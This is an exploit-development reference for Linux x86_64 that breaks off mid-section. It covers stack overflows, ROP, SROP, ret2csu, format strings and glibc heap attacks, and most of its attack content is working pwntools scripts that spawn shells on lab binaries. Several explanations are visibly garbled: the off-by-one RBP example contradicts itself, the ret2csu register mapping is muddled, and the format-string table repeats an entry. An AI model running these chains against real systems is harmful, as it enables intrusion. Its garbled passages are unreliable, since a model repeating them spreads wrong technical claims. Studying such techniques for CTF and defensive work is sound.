# Userspace Exploit Development: Stack & Heap Exploitation

> The definitive reference for memory corruption exploitation in userspace on Linux x86_64.

---

## Table of Contents

1. [Stack-Based Exploitation](#1-stack-based-exploitation)
   - [Stack Layout Deep Dive](#11-stack-layout-deep-dive-x86_64)
   - [Classic Buffer Overflow (ret2libc)](#12-classic-buffer-overflow-ret2libc)
   - [Off-by-One Stack Overflow](#13-off-by-one-stack-overflow)
   - [Stack Pivoting](#14-stack-pivoting)
   - [Return-Oriented Programming (ROP)](#15-return-oriented-programming-rop)
   - [SROP — Sigreturn-Oriented Programming](#16-srop--sigreturn-oriented-programming)
   - [ret2csu](#17-ret2csu)
   - [Stack-Based Format String Exploitation](#18-stack-based-format-string-exploitation)

2. [Heap Exploitation — glibc](#2-heap-exploitation--glibc)
   - [glibc malloc Internals Deep-Dive](#21-glibc-malloc-internals-deep-dive)
   - [Historical Exploits](#22-historical-heap-exploits)
   - [Modern glibc (2.35+) Exploitation](#23-modern-glibc-235-exploitation)
   - [FILE Structure Exploitation](#24-file-structure-exploitation)
   - [FSOP](#25-fsop--file-stream-oriented-programming)

3. [Heap Exploitation — Other Allocators](#3-heap-exploitation--other-allocators)
   - [jemalloc](#31-jemalloc-exploitation)
   - [tcmalloc](#32-tcmalloc-exploitation)
   - [musl libc](#33-musl-libc-heap-exploitation)
   - [Custom Allocators](#34-custom-allocator-exploitation-strategies)

---

# 1. Stack-Based Exploitation

## 1.1 Stack Layout Deep Dive (x86_64)

### System V AMD64 ABI Calling Convention

The x86_64 Linux ABI defines 14 general-purpose registers and strict rules for function calls:

**Integer/Pointer Arguments (in order):** `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`
**Floating-Point Arguments:** `xmm0`–`xmm7`
**Return Value:** `rax` (and `rdx` for 128-bit returns)
**Callee-saved:** `rbx`, `rbp`, `r12`–`r15`
**Stack Alignment:** 16-byte aligned at `call` instruction (RSP % 16 == 0 before call; return address push makes RSP % 16 == 8 on entry)

### Canonical Stack Frame Layout

```
High Address
  ┌──────────────────────┐
  │   Function Arguments  │  <─ 7th+ args pushed right-to-left
  │   (7th arg and up)    │
  ├──────────────────────┤
  │   Return Address      │  ← pushed by CALL instruction
  ├──────────────────────┤  ← RBP points here after 'push rbp'
  │   Saved RBP           │  ← previous frame's base pointer
  ├──────────────────────┤
  │   Local Variables     │
  │   (compiler-ordered)  │
  ├──────────────────────┤
  │   Saved Callee Regs   │  ← r12-r15, rbx saved if clobbered
  ├──────────────────────┤
  │   Alignment Padding   │  ← ensures RSP % 16 before CALL
  ├──────────────────────┤  ← RSP after prologue
  │   ...                 │
Low Address
```

### Function Prologue/Epilogue Pattern

```c
// Typical compiler output (gcc -O0)
func:
    push   rbp                    // save old frame pointer
    mov    rbp, rsp               // establish new frame
    sub    rsp, 0x40              // allocate locals (0x40 bytes)
    mov    QWORD [rbp-0x18], rdi  // store first arg
    mov    QWORD [rbp-0x20], rsi  // store second arg
    // ... function body ...
    leave                         // mov rsp, rbp; pop rbp
    ret                           // pop rip
```

**Key Insight for Exploitation:** The saved return address lives at `rbp+8`. Any write that reaches `rbp+8` and beyond controls RIP.

### Stack During `call func(1, 2, 3, 4, 5, 6, 7, 8)`

```
RSP+0x00:  [8th arg]        ← pushed last
RSP+0x08:  [7th arg]
RSP+0x10:  [return addr]    ← CALL pushes this
── after entering func ──
RSP+0x00:  [return addr]    ← RSP now points here
RSP+0x08:  [saved rbp]     ← after push rbp
```

Registers on entry: `rdi=1, rsi=2, rdx=3, rcx=4, r8=5, r9=6`.

---

## 1.2 Classic Buffer Overflow (ret2libc)

### Vulnerable Program

```c
// vuln.c — compile: gcc -o vuln vuln.c -fno-stack-protector -no-pie -z execstack
#include <stdio.h>
#include <string.h>

void win() {
    execve("/bin/sh", NULL, NULL);
}

void vulnerable() {
    char buf[64];
    gets(buf);  // unbounded read
}

int main() {
    vulnerable();
    return 0;
}
```

### Stack Layout at `gets(buf)` Call

```
HIGH ADDR
  ┌──────────────────────┐
  │   Return Address      │  ← offset +72 from buf (64 bytes + 8 saved rbp)
  ├──────────────────────┤
  │   Saved RBP           │  ← offset +64 from buf
  ├──────────────────────┤
  │                       │
  │   buf[64]             │  ← RSP after sub rsp, 0x40
  │   (64 bytes)          │
  │                       │
  └──────────────────────┘  ← buf starts here
LOW ADDR
```

### ret2libc Exploit (No ASLR, No PIE)

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./vuln')

# Step 1: Leak libc address via puts
rop = ROP(elf)
rop.puts(elf.got.puts)
rop.vulnerable()          # return to vulnerable() for second stage

payload = b'A' * 64 + b'B' * 8 + rop.chain()
p.sendline(payload)

# Parse leak
p.recvuntil(b'\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols.puts
log.info(f"libc base: {hex(libc.address)}")

# Step 2: Call system("/bin/sh")
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh'))])

payload2 = b'A' * 64 + b'B' * 8 + rop2.chain()
p.sendline(payload2)

p.interactive()
```

### With ASLR — ret2libc via Leak Chain

The exact pattern above works with ASLR too, provided PIE is disabled. The critical steps:

1. **Leak** a libc address from the GOT (which contains resolved runtime addresses).
2. **Calculate** the libc base from the leaked offset.
3. **Return** into vulnerable function for a second pass.
4. **Construct** a second payload using computed libc addresses.

When PIE is enabled, you must also leak a code address (from the stack) to compute the binary base.

---

## 1.3 Off-by-One Stack Overflow

### Vulnerability Pattern

```c
void vulnerable() {
    char buf[256];
    for (int i = 0; i <= 256; i++)   // off-by-one: writes 257 bytes
        buf[i] = read_byte();        // null byte at buf[256]
}
```

The off-by-one writes a **single null byte** over the **least significant byte** of the saved RBP.

### Effect: Partial RBP Corruption

```
Before:  saved_rbp = 0x7fffffffde00
After:   saved_rbp = 0x7fffffffde00  ← null byte overwrites LSByte
                     = 0x7fffffffde00  (if LSByte already zero, no effect)
                     = 0x7fffffffde00 & 0xFFFFFFFFFFFFFF00
                     = 0x7fffffffde00  ← depends on alignment

In practice:  0x7fffffffde48  →  0x7fffffffde00
```

### Exploitation Strategy

When the calling function uses `leave; ret`, the corrupted RBP becomes the new frame pointer. This causes a **framed chain** attack:

```c
// Caller after vulnerable() returns
void caller() {
    vulnerable();
    // 'leave' here does: mov rsp, rbp; pop rbp
    // But rbp now points to attacker-controlled stack!
    // After 'leave', rsp is attacker-controlled.
    // 'ret' then jumps to an attacker-controlled return address.
}
```

**Detailed Steps:**

1. Overflow writes null byte over `saved_rbp` LSB, rounding it down.
2. When `vulnerable()` returns, `leave` restores the **corrupted** RBP to the caller's frame pointer register.
3. Caller's `leave` sets RSP = corrupted RBP, then `pop rbp` loads an attacker value.
4. Next `ret` pops RIP from the **attacker-controlled stack region**.

```python
# Off-by-one exploit skeleton
payload  = b'A' * 256                     # fill buffer
payload += p64(fake_rbp)                   # overwrite saved_rbp with controlled value
# The null byte will zero the LSB of saved_rbp — plan accordingly
# fake_rbp should point to area where we place:
#   [pop rdi; ret] ["/bin/sh"] [system]
```

### Mitigation Notes

Modern compilers may not use RBP as a frame pointer (`-fomit-frame-pointer`), which defeats this technique. Check `readelf -w` or objdump to confirm RBP usage.

---

## 1.4 Stack Pivoting

Stack pivoting redirects RSP to an attacker-controlled memory region, enabling ROP even when the overflow is small.

### When to Pivot

- **Small overflow** (e.g., 8–16 bytes past saved EIP): not enough room for a full ROP chain.
- **Heap overflow** that overwrites a saved stack pointer.
- **ROP chain** must reside in a known writable region (bss, heap, mmap).

### Pivot Gadgets

```asm
; Common pivot gadgets:
xchg eax, esp ; ret        ; 32-bit: swap ESP with EAX (which you control)
mov esp, eax  ; ret        ; direct pivot
mov rsp, rdx  ; ret        ; 64-bit pivot via rdx
push rax      ; pop rsp    ; 2-gadget pivot: push value, then pop to rsp
add rsp, 0xNN ; ret        ; partial pivot — slide stack window

; "leave; ret" as a pivot:
; If RBP is controlled, 'leave' does: mov rsp, rbp; pop rbp
; This pivots to wherever RBP points.
```

### Pivot to Heap Example

```python
from pwn import *

p = process('./vuln')

# Assume: we can write ROP chain to heap at known_addr
# Overflow gives us control of saved EIP only (8 bytes)
heap_chain_addr = 0x404100  # known writable region

# Find pivot gadget
pivot_gadget = 0x401234     # mov rsp, rdi; ret  (or equivalent)
# Or use leave;ret pivot:
#   Set RBP to heap_chain_addr beforehand

payload  = b'A' * 64         # fill buffer
payload += p64(heap_chain_addr)  # corrupt saved_rbp to point at heap chain
payload += p64(leave_ret)        # return address = leave;ret to trigger pivot

# Alternative: direct pivot gadget
payload  = b'A' * 64
payload += b'B' * 8              # saved rbp (don't care)
payload += p64(pivot_gadget)      # eip -> mov esp, eax; ret
# where eax/rdi/rdx already contains target address
```

### Pivot via `__libc_malloc_hook` (Pre-glibc 2.34)

```python
# When you can write a hook pointer:
pivot_addr = 0x7ffff7a1b000 + OFFSET  # address of pivot gadget
libc_write_target = libc.symbols.__malloc_hook
# Overwrite __malloc_hook with pivot gadget address
# Trigger malloc → pivot gadget fires
```

---

## 1.5 Return-Oriented Programming (ROP)

### Core Concept

ROP chains short instruction sequences ending in `ret` (gadgets) to perform arbitrary computation. Each gadget pops its arguments from the stack:

```
Stack:              Execution:
┌────────────┐
│ gadget_1   │ ←── RIP points here
├────────────┤
│ arg1       │ ←── popped into rdi by gadget_1
├────────────┤
│ gadget_2   │ ←── gadget_1's ret jumps here
├────────────┤
│ arg2       │
├────────────┤
│ ...        │
└────────────┘
```

### Finding Gadgets

**ropper:**
```bash
ropper --file vuln --search "pop rdi; ret"
ropper --file vuln --search "syscall; ret"
ropper --file libc.so.6 --chain "execve"
```

**ROPgadget:**
```bash
ROPgadget --binary vuln --ropchain
ROPgadget --binary vuln --only "pop|ret" | grep rdi
```

**rp++:**
```bash
rp++ --file=vuln --unique 2>/dev/null | grep "ret"
```

**pwntools ROP:**
```python
from pwn import *
elf = ELF('./vuln')
rop = ROP(elf)
rop.call('write', [1, elf.got.puts, 8])
print(rop.dump())
```

### Building ROP Chains

#### execve("/bin/sh", NULL, NULL) — x86_64

```python
# Requirements: rdi = "/bin/sh", rsi = 0, rdx = 0, rax = 59, syscall
from pwn import *

def execve_chain(libc):
    rop = ROP(libc)
    binsh = next(libc.search(b'/bin/sh\x00'))
    rop.call('execve', [binsh, 0, 0])
    return rop.chain()

# Manual construction:
# pop rdi; ret           ← binsh
# pop rsi; ret           ← 0
# pop rdx; ret           ← 0        (or pop rdx; pop rbx; ret for glibc gadgets)
# pop rax; ret           ← 59
# syscall; ret
```

#### mprotect + Shellcode Chain

When W^X is enforced, use `mprotect` to make a region executable, then jump to shellcode:

```python
from pwn import *

def mprotect_shellcode_chain(elf, libc, shellcode_addr, shellcode):
    rop = ROP(libc)

    # Make the page executable: mprotect(page_align, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC=7)
    page_addr = shellcode_addr & ~0xFFF
    rop.mprotect(page_addr, 0x1000, 7)

    # Jump to shellcode
    rop.call(shellcode_addr)

    return rop.chain()

# Layout in memory:
# [mprotect chain] [shellcode (at shellcode_addr)]
```

#### open/read/write (ORW) Chain

For challenges where `execve` is blocked (seccomp), use ORW to read the flag:

```python
from pwn import *

def orw_chain(libc, flag_path_addr):
    rop = ROP(libc)

    # open(flag_path, O_RDONLY) = syscall 2
    rop.call('open', [flag_path_addr, 0])

    # Save fd (usually 3) — we need to move return value to rdi
    # Optional: assume fd=3 if it's the first opened file after 0,1,2

    # read(fd, buf, len) = syscall 0
    buf = libc.bss() + 0x200
    rop.call('read', [3, buf, 0x100])

    # write(1, buf, len) = syscall 1
    rop.call('write', [1, buf, 0x100])

    return rop.chain()
```

### Automatic ROP Chain Generation

**pwntools** provides `ROP` class for automatic chain building:
```python
rop = ROP(elf)
rop.puts(elf.got.puts)
rop.vulnerable()
payload = b'A' * offset + rop.chain()
```

**ropper** can generate full chains:
```bash
ropper --file vuln --chain "execve"
```

**ROPgadget** full chain generation:
```bash
ROPgadget --binary vuln --ropchain
```

**angr** symbolic execution for constraint solving:
```python
import angr
proj = angr.Project('./vuln')
state = proj.factory.entry_state()
# ... constrain symbolic memory with payload constraints
```

---

## 1.6 SROP — Sigreturn-Oriented Programming

### Concept

The `sigreturn` syscall restores **all** registers from a `sigframe` structure on the stack. By forging a sigframe and invoking `rt_sigreturn` (syscall 15), an attacker sets **every register** at once.

### sigframe Structure (x86_64)

```c
// Layout of ucontext_t / sigframe (simplified)
struct sigframe {
    // ... redzone, siginfo ...
    ucontext_t uc;
};

struct ucontext_t {
    unsigned long     uc_flags;      // offset 0x00
    struct ucontext_t *uc_link;      // offset 0x08
    stack_t           uc_stack;       // offset 0x10
    mcontext_t        uc_mcontext;    // offset 0x28 ← registers here
    // ...
};

// mcontext_t contains the general-purpose registers at known offsets:
// R8      @ +0x28+0x00
// R9      @ +0x28+0x08
// R10     @ +0x28+0x10
// R11     @ +0x28+0x18
// R12     @ +0x28+0x20
// R13     @ +0x28+0x28
// R14     @ +0x28+0x30
// R15     @ +0x28+0x38
// RDI     @ +0x28+0x40
// RSI     @ +0x28+0x48
// RBP     @ +0x28+0x50
// RBX     @ +0x28+0x58
// RDX     @ +0x28+0x60
// RAX     @ +0x28+0x68
// RCX     @ +0x28+0x70
// RSP     @ +0x28+0x78
// RIP     @ +0x28+0x80
// EFL     @ +0x28+0x88
// ...
```

### SROP Exploit

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')

# Gadgets needed:
#   mov eax, 15; ret    (or pop rax; ret with value 15 pushed)
#   syscall; ret
sigreturn_gadget = 0x401000   # syscall; ret (rt_sigreturn = 15)
mov_rax_15 = 0x40105a         # pop rax; ret  (then push 15)

frame = SigreturnFrame()
frame.rax = 59                # execve syscall number
frame.rdi = next(elf.search(b'/bin/sh\x00'))
frame.rsi = 0
frame.rdx = 0
frame.rip = sigreturn_gadget  # where to resume after sigreturn
frame.rsp = 0x7fffffffe000    # some valid stack address

payload  = b'A' * offset
payload += p64(mov_rax_15)    # set rax = 15 (SYS_rt_sigreturn)
payload += p64(15)            # value for pop rax
payload += p64(sigreturn_gadget)  # execute syscall
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```

**Note:** pwntools' `SigreturnFrame()` automatically handles the layout. For manual construction, the total frame size is 248 bytes on x86_64.

---

## 1.7 ret2csu

### The `__libc_csu_init` Gadgets

In any non-stripped x86_64 ELF linked with glibc, the function `__libc_csu_init` contains two universal gadgets:

```asm
; Gadget 1 (at end of __libc_csu_init) — "ret2csu popper"
0x4011d2:  pop  rbx            ; r12 → rbx
0x4011d3:  pop  rbp            ; r13 → rbp
0x4011d5:  pop  r12            ; loaded into r12 (available later)
0x4011d7:  pop  r13            ; loaded into r13
0x4011d9:  pop  r14            ; loaded into r14
0x4011db:  pop  r15            ; loaded into r15
0x4011dd:  ret

; Gadget 2 (earlier in __libc_csu_init) — "ret2csu caller"
0x4011b0:  mov  rdx, r14       ; arg3 = r14
0x4011b2:  mov  rsi, r15       ; arg2 = r15 (actually r13 -> r15 path; see below)
0x4011b5:  mov  rdi, r12       ; arg1 = r12 (actually rbx -> r12 path)
0x4011b8:  call QWORD [r15+rbx*8]  ; indirect call: call [r15 + rbx*8]
; After call returns:
0x4011bd:  add  rbx, 1
0x4011c1:  cmp  rbx, rbp
0x4011c4:  jne  0x4011b0
0x4011c6:  ...
0x4011d2:  (gadget 1 — popper)
```

**Corrected mapping for function call arguments:**
- `rdx = r14` → 3rd argument
- `rsi = r15` → 2nd argument (actually r13 passes through r15+8 logic in some versions; use `r15` directly)
- `rdi = r12` → 1st argument (actually `rbx` routes through as `r12`)
- Call target: `[r15 + rbx*8]` — pointer to function, stored at `r15 + rbx*8`

**To call `func(arg1, arg2, arg3)`:**
- Set `rbx = 0`, `rbp = 1` (so the loop executes exactly once)
- Set `r12 = arg1` (→ rdi)
- Set `r13` appropriately (often = arg2 source)
- Set `r14 = arg3` (→ rdx)
- Set `r15 = address_of_pointer_to_func` (where `*r15` = address of function)
- Or: Set `rbx = 0`, `r15 = address_of_func_pointer_entry`

### ret2csu Exploit Example

```python
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

# Addresses of the two gadgets
csu_popper = 0x4011d2    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_caller = 0x4011b0    # mov rdx, r14; ...; call [r15+rbx*8]; ...

# We need a writeable region with a known address to store function pointers
bss_addr = elf.bss()

# Write a pointer to write() into bss so we can call it via [r15+rbx*8]
# (In a real scenario, you'd write this via the first overflow or another primitive)
# Assume write_got is at a known address — we can use the GOT entry directly!
write_got = elf.got.write  # *write_got == address of write()

payload  = b'A' * offset
# First, call write(1, write_got, 8) to leak libc
payload += p64(csu_popper)
payload += p64(0)           # rbx = 0
payload += p64(1)           # rbp = 1 (loop runs once)
payload += p64(1)           # r12 = 1 → rdi (fd = stdout)
payload += p64(write_got)  # r13 → unused in caller, but needed for alignment
payload += p64(8)           # r14 → rdx (count = 8)
payload += p64(write_got)  # r15 → pointer to write function
payload += p64(csu_caller)  # execute the call: write(1, write_got, 8)

# After the call, control returns to the popper gadget again
payload += p64(0)           # rbx (padding)
payload += p64(1)           # rbp
payload += p64(0)           # r12
payload += p64(0)           # r13
payload += p64(0)           # r14
payload += p64(0)           # r15
# Now chain into second stage (ret2libc with leaked address)
payload += p64(ret2libc_stage2)

p.sendline(payload)
```

---

## 1.8 Stack-Based Format String Exploitation

### Vulnerability Pattern

```c
printf(user_input);  // format string vulnerability
```

The format string is read directly from attacker input, enabling reads and writes to arbitrary addresses.

### Format String Primitives

| Specifier | Action | Use |
|-----------|--------|-----|
| `%p` | Print pointer-width value | Leak stack values |
| `%x` | Print 4-byte hex value | Leak 32-bit values |
| `%d` | Print decimal value | Leak values |
| `%s` | Dereference and print string | Read arbitrary memory |
| `%n` | Write number of bytes printed so far | Write to arbitrary address |
| `%hn` | Write 2 bytes (short) | Partial overwrite |
| `%hhn` | Write 1 byte (char) | Byte-level overwrite |
| `%k$p` | Print k-th stack argument | Direct stack offset |
| `%k$p` | Jump to arg k | Parameter direct access |

### Stack Layout Relative to Format String

```
RSP+0x00:  [arg6 (rcx)]      ← %6$p (first arg on stack)
RSP+0x08:  [arg7 (r8)]       ← %7$p
RSP+0x10:  [arg8 (r9)]       ← %8$p
RSP+0x18:  [local1]          ← %9$p  (local variables)
RSP+0x20:  [local2]          ← %10$p
RSP+0x28:  [saved rbp]       ← %11$p
RSP+0x30:  [return addr]     ← %12$p
...
```

### Exploitation: Arbitrary Write via %n

```python
# Write 0xdeadbeef to address 0x41414141
# On 64-bit, need to write 2 bytes at a time (%hn) to avoid huge padding

from pwn import *

def fmt_write(addr, value, offset):
    """Generate format string payload to write `value` at `addr`."""
    payload = b''
    writes = []

    # Break value into 2-byte chunks
    val_bytes = []
    for i in range(0, 8, 2):
        chunk = (value >> (i * 8)) & 0xFFFF
        val_bytes.append((addr + i, chunk))

    # Sort by chunk value (ascending) to minimize padding
    val_bytes.sort(key=lambda x: x[1])

    written = 0
    for target_addr, target_val in val_bytes:
        if target_val > written:
            payload += f'%{target_val - written}c'.encode()
            written = target_val
        payload += f'%{offset}$hn'.encode()
        # Place target_addr in the payload string, aligned properly

    # Pad to align addresses on 8-byte boundary
    if len(payload) % 8 != 0:
        payload += b' ' * (8 - len(payload) % 8)

    # Append addresses
    for target_addr, _ in sorted(val_bytes, key=lambda x: x[0]):
        payload += p64(target_addr)

    return payload

# pwntools fmtstr helper:
payload = fmtstr_payload(offset, {0x404060: 0x1337})
p.sendline(payload)
```

### Direct Parameter Access

```python
# If the format string buffer is at offset 6 on the stack:
# Leak a libc address:
payload = b'%7$s'     # offset adjusted to point at GOT entry
payload += p64(elf.got.puts)
p.send(payload)
leak = u64(p.recv(6).ljust(8, b'\x00'))

# Overwrite GOT entry:
target = elf.got.puts
payload = fmtstr_payload(6, {target: libc_base + OFFSET})
p.sendline(payload)
```

---

# 2. Heap Exploitation — glibc

## 2.1 glibc malloc Internals Deep-Dive

### Chunk Structure

Every allocation is a "chunk" with metadata:

```
Allocated Chunk:
  ┌──────────────┐ ← chunk starts here (prev_size field when NOT in use)
  │ prev_size    │   8 bytes — size of previous chunk (ONLY if prev is free)
  ├──────────────┤
  │ size         │   8 bytes — this chunk's size (low 3 bits are flags)
  │  [A|M|P]    │   A=non-main-arena, M=mmap'd, P=prev_in_use
  ├──────────────┤ ← user data pointer (malloc return value)
  │ user data    │
  │ ...          │
  └──────────────┘

Free Chunk:
  ┌──────────────┐
  │ prev_size    │
  ├──────────────┤
  │ size         │
  ├──────────────┤
  │ fd           │   forward pointer — next free chunk in bin
  ├──────────────┤
  │ bk           │   backward pointer — prev free chunk in bin
  ├──────────────┤
  │ fd_nextsize  │   (only for large bins)
  ├──────────────┤
  │ bk_nextsize  │   (only for large bins)
  └──────────────┘
```

### Key Size Rules

- **Minimum chunk size:** `0x20` (32 bytes on x86_64) — 16 bytes metadata + 16 bytes minimum user data
- **MALLOC_ALIGNMENT:** 16 bytes on x86_64
- **Size is always aligned to 16 bytes** — low 3 bits repurposed as flags
- **request2size(n):** `(n + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK`
  - On x86_64: `(n + 8 + 15) & ~15` (approximately(n + 24) & ~15)
- **`prev_size` field**: When the preceding chunk is in use, this field belongs to the preceding chunk's user data. This is a critical exploitation primitive.

### Bins Overview

```
                    ┌─────────────────────────────────┐
                    │            BINS                  │
                    ├─────────────────────────────────┤
  Fastbins ───────→ │ Fastbins [10] (singly-linked)   │
                    │   idx 0: size 0x20              │
                    │   idx 1: size 0x30              │
                    │   idx 2: size 0x40              │
                    │   idx ...                       │
                    ├─────────────────────────────────┤
  Tcache ─────────→ │ Tcache [64] (per-thread, 64)   │
 (glibc ≥ 2.26)    │   idx 0: size 0x20, 7 entries   │
                    │   idx 1: size 0x30, 7 entries   │
                    │   idx ...                       │
                    │   idx 63: size 0x410            │
                    ├─────────────────────────────────┤
  Unsorted ────────→│ Unsorted bin (1, doubly-linked)  │
                    │   Holds recently freed chunks    │
                    │   before binning                 │
                    ├─────────────────────────────────┤
  Small bins ──────→│ Small bins [62] (doubly-linked)  │
                    │   Each holds one exact size      │
                    │   sizes 0x20 to 0x3f0 (16-byte steps) │
                    ├─────────────────────────────────┤
  Large bins ──────→│ Large bins [63] (doubly-linked)  │
                    │   Each holds a range of sizes    │
                    │   sizes 0x400+                   │
                    └─────────────────────────────────┘
```

### Tcache (Thread Local Cache) — glibc ≥ 2.26

Tcache is a per-thread cache of recently freed small chunks. It has **priority over fastbins**.

```
Each tcache entry: singly-linked LIFO list, max 7 entries per size class

tcache_entry:
  ┌──────────────┐
  │ next         │  ← pointer to next entry (key field for double-free detection in 2.29+)
  ├──────────────┤
  │ key          │  ← tcache_key (random value in 2.29+, used for double-free detection)
  ├──────────────┤
  │ (user data)  │
  └──────────────┘

tcache_perthread_struct:
  ┌──────────────────┐
  │ counts[64]       │  ← number of entries per bin (max 7)
  ├──────────────────┤
  │ entries[64]       │  ← head pointers (singly-linked)
  └──────────────────┘
```

**Key Behaviors:**
- Freed chunks go to tcache first (if not full)
- `malloc()` checks tcache first (LIFO)
- No consolidation on tcache free
- **No integrity checks** on fd pointer in tcache free (before 2.29)
- **glibc 2.29+**: `tcache_key` added for double-free detection (can be bypassed — see House of Botcake)
- **glibc 2.34+**: `tcache_key` uses a random value per thread

### Fastbins

```
Fastbin list (singly-linked, LIFO):
  ┌──────────┐     ┌──────────┐     ┌──────────┐
  │ malloc_state │  │  Chunk A  │     │  Chunk B  │     │  Chunk C  │
  │  fb[0]   │────→│  fd -------+───→│  fd -------+───→ NULL
  └──────────┘     │  (0x20)   │     │  (0x20)   │     │  (0x20)   │
                   └──────────┘     └──────────┘     └──────────┘

Fastbin index: (request >> 4) - 2
  request=0x20 → idx 0  (0x20 chunks)
  request=0x30 → idx 1  (0x30 chunks)
  ...

Size check on free(): P bit must be set (prev_in_use)
NO consolidation with adjacent chunks
NO size validation on malloc from fastbin (before glibc 2.29)
```

### Unsorted Bin

- A single doubly-linked list holding chunks recently freed.
- Chunks are moved to appropriate small/large bins during `malloc()`.
- Very useful for leaking libc addresses — a freed unsorted bin chunk has `fd`/`bk` pointing into `main_arena` (inside libc).

### Security Checks Evolution

| Check | Added in | Affects |
|-------|----------|---------|
| Size check on fastbin free | 2.29+ | Fastbin dup |
| `tcache_key` double-free detection | 2.29+ | Tcache double-free |
| `__free_hook` removed | 2.34+ | All hook-based exploits |
| `__malloc_hook` removed | 2.34+ | All hook-based exploits |
| Safe-linking (pointer mangling) | 2.32+ | All singly-linked bins (fastbin, tcache) |
| Bypass safe-linking via `tcache_perthread_struct` write | Always | Needs arbitrary write |

---

## 2.2 Historical Heap Exploits

### Fastbin Dup (Double-Free)

**Works:** glibc < 2.29 (no `tcache_key`, no fastbin size check on free)

```c
// Vulnerability: double-free
free(ptr1);
// ... no other free of this size ...
free(ptr1);  // forbidden! but no check before 2.29
```

```python
# Exploit:
free(A)   # fastbin: A → A (cycle, but A's fd still points to itself)
free(A)   # now: A → A → A → ...
malloc()   # returns A
malloc()   # returns A again (same address!)
# Write to the second allocation → corrupt A's fd → malloc() returns attacker addr
```

**Concrete steps:**

```python
from pwn import *

p = process('./vuln')  # glibc < 2.29

def malloc(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendlineafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

# Allocate 3 chunks
malloc(0x28, b'A'*0x28)   # chunk 0
malloc(0x28, b'B'*0x28)   # chunk 1 — prevent consolidation with top
malloc(0x28, b'C'*0x28)   # chunk 2 — victim

# Double-free chunk 2 (fastbin dup)
free(2)  # fastbin[0x30]: C
free(2)  # fastbin[0x30]: C → C (corrupt: self-referencing)
# Need a free in between to avoid immediate detection (just the double-free check)
# Actually in classic fastbin dup, we do: free(A); free(B); free(A)

# Allocate from fastbin — overwrite fd
malloc(0x28, p64(0xdeadbeef))  # writes fake fd into chunk
# Now fastbin[0x30]: 0xdeadbeef → C
malloc(0x28, b'JUNK')          # pops C
malloc(0x28, b'JUNK')          # pops 0xdeadbeef — arbitrary malloc!
```

### Unsorted Bin Leak

```python
# Free a large chunk (size >= 0x420 for it to go to unsorted bin directly)
# Its fd/bk will point to main_arena+offset inside libc

malloc(0x420, b'A')  # chunk 0
malloc(0x20, b'B')   # chunk 1 — prevent top chunk consolidation

free(0)  # chunk 0 goes to unsorted bin, fd/bk = &main_arena.bins[0]

# Read chunk 0's fd pointer → leaks libc address
# main_arena is in libc, offset depends on version
# libc_base = leaked_addr - main_arena_offset - 0x60 (for unsorted bin fd offset)
```

### Unsafe Unlink

**Works:** glibc < 2.29 (no `unlink_chunk` size validation in older versions; modern glibc has harder checks)

When `free()` consolidates a chunk, it calls `unlink()` on the adjacent free chunk. By forging fake chunk metadata, we can trigger a write-what-where:

```
unlink(av, p, bck, fwd):
  if (p->fd->bk != p || p->bk->fd != p)
    abort();  // "corrupted double-linked list"
  p->fd->bk = p->bk;
  p->bk->fd = p->fd;

// This writes:
//   *(p->fd + 0x18) = p->bk
//   *(p->bk + 0x28) = p->fd  (on 64-bit, offsets are 0x18 and 0x28)
// Or on modern 64-bit glibc: offsets 0x10 and 0x18 for fd/bk in free chunk
```

```python
# Forge a fake chunk at address FAKE
# FAKE+0x00: prev_size (don't care)
# FAKE+0x08: size = 0x20 (or any valid size)
# FAKE+0x10: fd = &FAKE - 0x18  (so fd->bk == FAKE)
# FAKE+0x18: bk = &FAKE - 0x10  (so bk->fd == FAKE)
# This satisfies: p->fd->bk == p and p->bk->fd == p

# Then overflow adjacent chunk's prev_size and clear P flag to trigger
# consolidation with our fake chunk.
```

### House of Force

**Works:** glibc < 2.29 (top chunk size validation added)

Corrupt the top chunk's size field to a very large value, then request a specially-sized allocation to move the top chunk pointer to an attacker-chosen address.

```python
# Overflow into top chunk, set size to 0xFFFFFFFFFFFFFFFF
overwrite_top_size(0xffffffffffffffff)

# Allocate a chunk of size (target_addr - top_chunk_addr - 0x10)
# This moves top_chunk to target_addr
# Next allocation returns a chunk at target_addr

target = 0x404080          # e.g., __free_hook in older glibc
top_addr = 0x603000         # current top chunk address
distance = target - top_addr - 0x10  # adjust for metadata

malloc(distance, b'PAD')    # advance top to near target
malloc(0x20, p64(system))  # allocate at target — overwrite __free_hook
```

### House of Spirit

Forge a fake chunk in an attacker-controlled region (stack, bss, heap) and free it. It then re-enters a bin and can be malloc'd.

```python
# Forge fake chunk on the stack:
fake_chunk = 0x7fffffffde00
# Write:
# *(fake_chunk + 0x00) = 0                    # prev_size
# *(fake_chunk + 0x08) = 0x61                  # size (fastbin size, P bit set)
# *(fake_chunk + 0x10) = 0 (garbage)           # fd (doesn't matter)
# *(fake_chunk + 0x18) = 0 (garbage)           # bk (doesn't matter)
# *(fake_chunk + 0x20) = ...                    # must not be near a claimed free chunk

# Free this fake chunk with a heap overflow that overwrites a pointer
# that's later freed:
free(fake_chunk_ptr)  # frees our fake chunk into fastbin

# Next malloc(0x50) returns our fake chunk address!
malloc(0x50, p64(0xdeadbeef))  # write to stack/bss
```

---

## 2.3 Modern glibc (2.35+) Exploitation

### Tcache Poisoning

**Works:** All glibc ≥ 2.26. With safe-linking (≥ 2.32), need to mangle pointers.

```python
# glibc < 2.32 (no safe-linking)
free(A)          # tcache[idx]: A → NULL
free(B)          # tcache[idx]: B → A → NULL

# Overflow B's fd to point to target:
overwrite(B + 0x10, target_addr)  # tcache[idx]: B → target → ???

malloc()  # returns B
malloc()  # returns target — arbitrary write!
```

```python
